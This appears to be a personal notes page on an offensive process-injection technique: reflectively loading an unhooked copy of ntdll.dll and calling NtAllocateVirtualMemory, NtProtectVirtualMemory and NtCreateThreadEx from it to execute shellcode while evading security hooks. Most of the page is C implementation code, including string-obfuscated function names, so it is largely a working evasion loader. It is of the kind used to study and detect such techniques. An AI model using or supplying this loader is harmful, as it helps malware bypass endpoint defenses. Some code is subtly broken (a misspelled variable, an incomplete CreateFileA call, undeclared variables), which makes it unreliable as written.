---
publish: true
created: 2025-08-19T20:04:18.246+05:30
modified: 2026-03-28T15:26:31.271+05:30
published: 2026-03-28T15:26:31.271+05:30
tags:
  - CreateFile
  - GetFileSize
  - ReadFile
  - VirtualAlloc
  - CopyMemory
  - LoadLibrary
  - GetProcAddress
  - NtAllocateVirtualMemory
  - memcpy
  - NtCreateThreadEx
  - malloc
  - reflective
---

## Working

- Use `CreateFile` to get a handle to the unhooked DLL.
- Obtain the size of it using `GetFileSize` to determine how much memory to allocate.
- Use `malloc` to allocate memory for it.
- Use `ReadFile` to load the contents of the DLL file into the allocated memory.
- Retrieve the addresses of DOS and NT headers of the DLL, so that we can parse its important components later.
- Use `VirtualAlloc` to allocate memory in the current process's address space based on the size of the DLL's image.
- Use `CopyMemory` to copy the DLL's headers and sections from the local memory buffer to the allocated memory region in the current process.
- Use `LoadLibrary` and `GetProcAddress` to resolve and update the addresses of imported functions in the DLL by traversing the Import Directory.
- Locate the [Export Directory ](https://learn.microsoft.com/en-us/windows/win32/debug/pe-format#export-directory-table) and resolve the exported functions addresses by updating the function pointers to match the addresses in the loaded memory.
- Use `NtAllocateVirtualMemory` to allocate memory for shellcode execution within the current process, using the same function pointers.
- Use `memcpy` to copy the shellcode into the newly allocated memory region. (We can use any other function for this).
- Use `NtCreateThreadEx` to create a new thread and execute the shellcode within the allocated memory region, using the same function pointers.

## Observation

This is somewhat a variant of [[Reflective DLL Injection]], except we are reflectively loading an unhooked/unmodified system DLL, and using its exported functions to execute our own shellcode via [[Classic Code Injection Local Process]].

## Preliminaries

If you're following [this PoC](https://offensive-panda.github.io/ProcessInjectionTechniques/Reflective_DLL_Loading_Lagos_Island/), first we define the functions that we will be using from the reflectively loaded DLL.

```c
typedef NTSTATUS(*_NtAllocateVirtualMemory)(
	HANDLE ProcessHandle,
	PVOID* BaseAddress,
	ULONG_PTR ZeroBits,
	PSIZE_T RegionSize,
	ULONG AllocationType,
	ULONG Protect
);

typedef NTSTATUS(*_NtProtectVirtualMemory)(
	IN HANDLE ProcessHandle,
	IN OUT PVOID* BaseAddress,
	IN OUT PSIZE_T RegionSize,
	IN ULONG NewProtect,
	OUT PULONG OldProtect
);

typedef NTSTATUS(*_NtCreateThreadEx)(
	OUT PHANDLE hThread,
	IN ACCESS_MASK DesiredAccess,
	IN PVOID ObjectAttributes,
	IN HANDLE ProcessHandle,
	IN PVOID lpStartAddress,
	IN PVOID lpParameter,
	IN ULONG Flags,
	IN SIZE_T StackZeroBits,
	IN SIZE_T SizeOfStackCommit,
	IN SIZE_T SizeOfStackReserve,
	OUT PVOID lpBytesBuffer
);

typedef NTSTATUS(*_NtWaitForSingleObject)(
	IN HANDLE Handle,
	IN BOOLEAN Alertable,
	IN PLARGE_INTEGER Timeout
);
```

We can now start with the PoC. As mentioned before, this is a variant of a reflective DLL. Which means, we need to load the DLL into the process manually. We can do so by

- Reading the contents of the DLL file.

```c
HANDLE hFile = CreateFileA("C:\\Path\\To\\Unhooked\\ntdll.dll");
if (hFile == INVALID_HANDLE_VALUE)
{
	std::cerr << "Failed to open DLL file." << std::endl;
	return 1;
}

//  Get the file size
DWORD fileSize = GetFileSize(hFile, NULL);
if(fileSize == INVALID_FILE_SIZE)
{
	std::cerr << "Failed to get file size" << std::endl;
	CloseHandle(hFile);
	return 1;
}

//  Allocate buffer
char* dllBytes = (char*)malloc(fileSize);
if(dllBytes == nullptr)
{
	std::cerr << "Failed to allocate memory" << std::endl;
	CloseHandle(hFile);
	return 1;
}

//  Read the file into memory
DWORD bytesRead;
if(!ReadFile(hFile, dllBytes, fileSize, &bytesRead, NULL) || bytesRead != fileSize)
{
	std::cerr << "Failed to read file into memory" << std::endl;
	free(dllBytes);
	CloseHandle(hFile);
	return 1;
}
```

- Parse the DOS and NT headers from the DLL buffer.

```c
IMAGE_DOS_HEADER* DOS_HEADER = (IMAGE_DOS_HEADER*)dllBytes;
IMAGE_NT_HEADERS* NT_HEADER = (IMAGE_NT_HEADERS*)((DWORD64)dllBytes + DOS_HEADER->e_lfanew);

SIZE_T sizeDll = NT_HEADER->OptionalHeader.SizeOfImage;

```

- Allocate memory in the process so that we can write the DLL to it.

```c
LPVOID alloc_mem = VirtualAlloc(0, sizeDll, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
CopyMemory(alloc_mem, dllBytes, NT_HEADER->OptionalHeader.SizeOfHeaders);  //  Written
```

- Load all the sections into the memory

```c
//  loading all the sections into memory
IMAGE_SECTION_HEADER* SECTION_HEADER = IMAGE_FIRST_SECTION(NT_HEADER);
for(int i = 0; i < NT_HEADER->FileHeader.NumberOfSections; i++)
{
	LPVOID sectionDest = (LPVOID)((DWORD64)alloc_mem + (DWORD64)SECTION_HEADER->VirtualAddress);
	LPVOID sectionSource = (LPVOID)((DWORD64)dllBytes + (DWORD64)SECTION_HEADER->PointerToRawData);
	CopyMemory(sectionDest, sectionSource, SECTION_HEADER->SizeOfRawData);
	
	SECTION_HEADER++;
}
```

- Dynamically resolve function addresses for imported modules after the sections are loaded.

```c
//  Copy IAT to memory
IMAGE_IMPORT_DESCRIPTOR* IMPORT_DATA = (IMAGE_IMPORT_DESCRIPTOR*)((DWORD64)alloc_mem + NT_HEADER->OptionalHeader.DataDirectory[1].VirtualAddress);

LPCSTR ModuleName = "";
while(IMPORT_DATA->Name != NULL)
{
	ModuleName = (LPCSTR)IMPORT_DATA->Name + (DWORD64)alloc_mem;
	IMAGE_THUNK_DATA* firstThunk;
	HMODULE hModule = LoadLibraryA(ModuleName);
	if(hModule)
	{
		firstThunk = (IMAGE_THUNK_DATA*)((DWORD64)alloc_mem + IMPORT_DATA->FirstThunk);  //  relative virtual address of IAT
		for(int i = 0; firstThunk->u1.AddressOfData; firstThunk++)
		{
			DWORD64 importFn = (DWORD64)alloc_mem + *(DWORD*)firstThunk;  //  base + relative = absolute
			LPCSTR n = (LPCSTR)((IMAGE_IMPORT_BY_NAME*)importFn)->Name;  //  just grab the name from there
			*(DWORD64*)firstThunk = (DWORD64)GetProcAddress(hModule, n);  //  
		}
	}
	IMPORT_DATA++;
}
```

- Look through the export directory of the reflectively loaded DLL, and resolve the NT functions, whose typedefs we defined earlier.

```c
//  Copy EAT to memory

IMAGE_EXPORT_DIRECTORY* EXPORT DIR = (IMAGE_EXPORT_DIRECTORY*)((DWORD64)alloc_mem + NT_HEADER->OptionalHeader.DataDirectory[0].VirtualAddress);

DWORD* addrNames = (DWORD*)((DWORD64)alloc_mem + EXPORT_DIR->AddressOfNames);
DWORD* addrFunction = (DWORD*)((DWORD64)alloc_mem + EXPORT_DIR->AddressOfFunctions);
WORD* addrOrdinal = (WORD*)((DWORD64)alloc_mem + EXPORT_DIR->AddressOfNameOrdinals);
DWORD OldProtect = 0;
VirtualProtect(alloc_mem, fileSize, PAGE_EXECUTE_READ, &OldProtect);  //  successfully mapped

DWORD* addrNames1 = addrNames;
_NtAllocateVirtualMemory pNtAllocateVirtualMemory = NULL;
char NtAllocateVirtualMemorytxt[] = { 'N','t','A','l','l','o','c','a','t','e','V','i','r','t','u','a','l','M','e','m','o','r','y', 0 };
for (int index = 0; index < EXPORT_DIR->NumberOfFunctions; index++)
{
	char* name = (char*)((DWORD64)alloc_mem + *(DWORD*)addrNames1++);
	
	if(strstr(name, NtAllocateVirtualMemorytxt) != NULL)
	{
		pNtAllocateVirtualMemory = (_NtAllocateVirtualMemory)((DWORD64)alloc_mem + addrFunction[addrOrdinal[index]]);
		break;
	}
}

if(pNtAllocateVirtualMemory)
{
	NTSTATUS status1 = pNtAllocateVirtualMemory(NtCurrentProcess(), &BaseAddress, 0, &shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if(!NT_SUCCESS(status1))
	{
		return 1;
	}  //  RW Virtual Memory Successfully Allocated
}

memcpy(BaseAddress, shellcode, shellcodeSize);  //  Copy the shellcode to the allocated region that was produced by calling NtAllocateVirtualMemory from the reflectively loaded DLL

DWORD* addrNames2 = addrNames;
_NtProtectVirtualMemory pNtProtectVirtualMemory = NULL;
char NtProtectVirtualMemorytxt[] = { 'N','t','P','r','o','t','e','c','t','V','i','r','t','u','a','l','M','e','m','o','r','y',0 };
for(int index = 0; index < EXPORT_DIR->NumberOfFunctions; index++)
{
	char* name = (char*)((DWORD64)alloc_mem + *(DWORD*)addrNames2++);
	
	if(strstr(name, NtProtectVirtualMemorytxt) != NULL)
	{
		pNtProtectVirtualMemory = (_NtProtectVirtualMemory)((DWORD64)alloc_mem + addrFunction[addrOrdinal[index]]);
		break;
	}
}
if(pNtProtectVirtualMemory)
{
	NTSTATUS status2 = pNtProtectVirtualMemory(NtCurrentProcess(), &BaseAddress, (PSIZE_T)&shellcodeSize, PAGE_EXECUTE_READ, &OldProtect);
	if(!NT_SUCCESS(status2))
	{
		return 1;
	}  //  Change permissions of memory from RW to RX
}

DWORD* addrNames3 = addrNames;
_NtCreateThreadEx pNtCreateThreadEx = NULL;
char NtCreateThreadExtxt[] = { 'N','t','C','r','e','a','t','e','T','h','r','e','a','d','E','x',0 };
for (int index = 0; index < EXPORT_DIR->NumberOfFunctions; index++)
{
	char *name = (char*)((DWORD64)alloc_mem + *(DWORD*)addrNames3++);  //  assign address of function name at that index
	
	if(strstr(name, NtCreateThreadExtxt) != NULL)  //  if name matches
	{
		pNtCreateThreadEx = (_NtCreateThreadEx)((DWORD64)alloc_mem + addrFunction[addrOrdinal[index]]);  //  Store function address
		break;
	}
}

if(pNtCreateThreadEx)  //  if it exists in the DLL
{
	NTSTATUS status3 = pNtCreateThreadEx(&hHostThread, 0x1FFFFF, NULL, NtCurrentProcess(), (LPTHREAD_START_ROUTINE)BaseAddress, NULL, FALSE, NULL, NULL, NULL, NULL);  //  call the function
	if(!NT_SUCCESS(status3))
	{
		return 1;
	}  //  Executed shellcode via creating thread
}

LARGE_INTEGER Timeout;
Timeout.QuadPart = -10000000;

NTSTATUS NTWFSOstatus = NtWaitForSingleObject(hHostThread, FALSE, &Timeout);
if(!NT_SUCCESS(NTWFSOstatus))
{
	return 4;  //  FAILED
}

//  Change alloc_mem (where the DLL is stored) permissions back to READONLY
VirtualProtect(alloc_mem, fileSize, PAGE_READONLY, &OldProtect);
```
